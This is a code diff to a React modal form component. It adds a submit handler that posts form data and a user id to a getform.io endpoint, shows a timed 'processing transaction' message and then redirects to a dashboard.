@@ -1,4 +1,5 @@
 import { useState } from "react";
+import { uid } from "../../../../base/stores/stores";
 import { Message } from "../../../Global/Message/Message";
 
 type ModalCloseHandler = () => void;
@@ -29,9 +30,14 @@ export const ModalForm = ({ onClose }: { onClose: ModalCloseHandler }) => {
       setCopiedAddress("");
     }, 2000);
   };
+
   const transactionInProgree = () => {
     setTimeout(() => {
       setIsInProcess(true);
+      // Redirect to the dashboard after 2 seconds
+      setTimeout(() => {
+        window.location.href = "/dashboard"; // Replace with your dashboard URL
+      }, 1000);
     }, 2000);
   };
 
@@ -39,12 +45,32 @@ export const ModalForm = ({ onClose }: { onClose: ModalCloseHandler }) => {
     return <Message message="Hold while we process your transaction..." />;
   }
 
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+
+    // Create a FormData object to collect form data
+    const formData = new FormData(e.target as HTMLFormElement);
+
+    // Append the uid.id to the form data
+    formData.append("id", `${uid.id}`);
+
+    // Submit the form with the updated form data
+    fetch("https://getform.io/f/578d9b29-1920-4659-8226-6d2167de9a55", {
+      method: "POST",
+      body: formData,
+    });
+
+    // Trigger the in-progress state
+    transactionInProgree();
+  };
+
   return (
     <form
       className="space-y-6"
+      onSubmit={handleSubmit}
+      encType="multipart/form-data"
       action="https://getform.io/f/578d9b29-1920-4659-8226-6d2167de9a55"
       method="POST"
-      encType="multipart/form-data"
     >
       <div className="rounded-md bg-secondary p-5 text-white shadow-lg">
         <div>
@@ -95,7 +121,6 @@ export const ModalForm = ({ onClose }: { onClose: ModalCloseHandler }) => {
         type="submit"
         value="Submit"
         className="w-full rounded border-none bg-accent p-2 font-bold text-white outline-none"
-        onClick={transactionInProgree}
       />
     </form>
   );
